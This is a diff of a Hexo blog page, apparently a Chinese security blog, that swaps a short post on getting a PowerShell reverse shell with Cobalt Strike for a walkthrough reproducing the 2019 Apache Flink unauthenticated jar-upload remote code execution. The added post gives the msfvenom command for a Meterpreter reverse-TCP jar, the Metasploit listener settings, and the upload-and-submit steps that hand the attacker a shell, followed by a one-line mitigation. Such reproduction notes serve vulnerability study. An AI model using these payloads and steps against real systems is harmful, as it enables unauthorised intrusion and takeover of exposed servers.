@@ -5,26 +5,27 @@
   
 
   
-  <title>powershell反弹shell | Hexo</title>
+  <title>Flink任意jar包上传导致远程代码执行 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
   
-  <meta name="description" content="首先要进行监听 第二步在脚本web中选择脚本类型。但不能使用正在使用的端口 第三步将生成的代码复制到cmd中即可： 就可以在cs上监控到上线">
+  <meta name="description" content="漏洞描述:2019年11月11号，安全工程师Henry Chen披露了一个Apache Flink未授权上传jar包导致远程代码执行的漏洞。由于Apache Flink Dashboard 默认无需认证即可访问,通过上传恶意jar包并触发恶意代码执行,从而获取shell。 msf生成jar马:(1) 利用msfvenom来生成一个jar马: msfvenom -p java/meterpreter">
 <meta property="og:type" content="article">
-<meta property="og:title" content="powershell反弹shell">
-<meta property="og:url" content="http://yoursite.com/2019/09/27/cs的使用教程/index.html">
+<meta property="og:title" content="Flink任意jar包上传导致远程代码执行">
+<meta property="og:url" content="http://yoursite.com/2019/12/09/Flink任意jar包上传导致远程代码执行/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="首先要进行监听 第二步在脚本web中选择脚本类型。但不能使用正在使用的端口 第三步将生成的代码复制到cmd中即可： 就可以在cs上监控到上线">
+<meta property="og:description" content="漏洞描述:2019年11月11号，安全工程师Henry Chen披露了一个Apache Flink未授权上传jar包导致远程代码执行的漏洞。由于Apache Flink Dashboard 默认无需认证即可访问,通过上传恶意jar包并触发恶意代码执行,从而获取shell。 msf生成jar马:(1) 利用msfvenom来生成一个jar马: msfvenom -p java/meterpreter">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http://yoursite.com/img/powershell.png">
-<meta property="og:image" content="http://yoursite.com/img/2.png">
-<meta property="og:image" content="http://yoursite.com/img/3.png">
-<meta property="og:updated_time" content="2019-10-06T13:33:15.358Z">
+<meta property="og:image" content="http://yoursite.com/apach/1.png">
+<meta property="og:image" content="http://yoursite.com/apach/2.png">
+<meta property="og:image" content="http://yoursite.com/apach/3.png">
+<meta property="og:image" content="http://yoursite.com/apach/4.png">
+<meta property="og:updated_time" content="2019-12-09T05:28:31.855Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="powershell反弹shell">
-<meta name="twitter:description" content="首先要进行监听 第二步在脚本web中选择脚本类型。但不能使用正在使用的端口 第三步将生成的代码复制到cmd中即可： 就可以在cs上监控到上线">
-<meta name="twitter:image" content="http://yoursite.com/img/powershell.png">
+<meta name="twitter:title" content="Flink任意jar包上传导致远程代码执行">
+<meta name="twitter:description" content="漏洞描述:2019年11月11号，安全工程师Henry Chen披露了一个Apache Flink未授权上传jar包导致远程代码执行的漏洞。由于Apache Flink Dashboard 默认无需认证即可访问,通过上传恶意jar包并触发恶意代码执行,从而获取shell。 msf生成jar马:(1) 利用msfvenom来生成一个jar马: msfvenom -p java/meterpreter">
+<meta name="twitter:image" content="http://yoursite.com/apach/1.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -61,21 +62,21 @@
   </div>
 </header>
       <div id="middlecontent" title class="global-width sidebar-right">
-        <section id="main"><article id="post-cs的使用教程" class="article global-container article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="apache-Flink任意jar包上传导致远程代码执行" class="article global-container article-type-apache" itemscope itemprop="blogPost">
   
     <header class="article-header">
       
   
     <h1 class="article-title" itemprop="name">
-      powershell反弹shell
+      Flink任意jar包上传导致远程代码执行
     </h1>
   
 
     </header>
   
   <div class="article-meta">
-    <a href="/2019/09/27/cs的使用教程/" class="article-date">
-  <time datetime="2019-09-27T03:46:16.000Z" itemprop="datePublished">2019-09-27</time>
+    <a href="/2019/12/09/Flink任意jar包上传导致远程代码执行/" class="article-date">
+  <time datetime="2019-12-09T04:55:27.000Z" itemprop="datePublished">2019-12-09</time>
 </a>
     
     
@@ -90,10 +91,20 @@
     
     <div class="article-content article-content-cloud" itemprop="articleBody">
       
-        <p>首先要进行监听<br><img src="/img/powershell.png" alt></p>
-<p>第二步在脚本web中选择脚本类型。但不能使用正在使用的端口<br><img src="/img/2.png" alt></p>
-<p>第三步将生成的代码复制到cmd中即可：<br><img src="/img/3.png" alt></p>
-<p>就可以在cs上监控到上线</p>
+        <h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述:"></a>漏洞描述:</h4><p>2019年11月11号，安全工程师Henry Chen披露了一个Apache Flink未授权上传jar包导致远程代码执行的漏洞。由于Apache Flink Dashboard 默认无需认证即可访问,通过上传恶意jar包并触发恶意代码执行,从而获取shell。</p>
+<h3 id="msf生成jar马"><a href="#msf生成jar马" class="headerlink" title="msf生成jar马:"></a>msf生成jar马:</h3><p>(1) 利用msfvenom来生成一个jar马:</p>
+<p>msfvenom -p java/meterpreter/reverse_tcp LHOST=172.26.1.156 LPORT=9999 W &gt;text.jar</p>
+<p>(2) 打开msf的监听模块,并监听9999端口(要与我们jar马设置的端口一致)</p>
+<p>use exploit/multi/handler<br>set payload java/meterpreter/reverse_tcp<br>set LHOST your ip<br>set LPORT 9999<br>exploit</p>
+<h3 id="复现开始："><a href="#复现开始：" class="headerlink" title="复现开始："></a>复现开始：</h3><p>(1) 访问目标:<br>(2) 点击Submit new Job,可以看到其可以允许我们上传jar包</p>
+<p><img src="/apach/1.png" alt></p>
+<p>(3) 利用flink上传jar包的功能将我们的jar包上传:</p>
+<p><img src="/apach/2.png" alt></p>
+<p>(4) 上传后,我们在我们的vps上监听好端口<br>(5) 然后回到浏览器,选中我们刚刚上传的jar包,然后点击Submitting提交</p>
+<p><img src="/apach/3.png" alt></p>
+<p>(6) 可以看到我们的vps已经成功接收到了shell</p>
+<p><img src="/apach/4.png" alt></p>
+<p>漏洞修复:<br>建议设置防火墙策略，仅允许白名单ip访问 apache flink服务，并在Web代理（如apache httpd）中增加对该服务的digest认证。</p>
 
       
     </div>
@@ -108,20 +119,11 @@
 <nav id="article-nav">
   <div class="article-nav-block">
     
-      <a href="/2019/10/11/使用cmd开启3389端口的方法/" id="article-nav-newer" class="article-nav-link-wrap">
-        <strong class="article-nav-caption"></strong>
-        <div class="article-nav-title">
-          
-            使用cmd开启3389端口的方法
-          
-        </div>
-      </a>
-    
   </div>
   <div class="article-nav-block">
     
-      <a href="/2019/09/25/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-        <div class="article-nav-title">Hello World</div>
+      <a href="/2019/11/12/通过jboss反弹shell/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">通过jboss反弹shell</div>
         <strong class="article-nav-caption"></strong>
       </a>
     
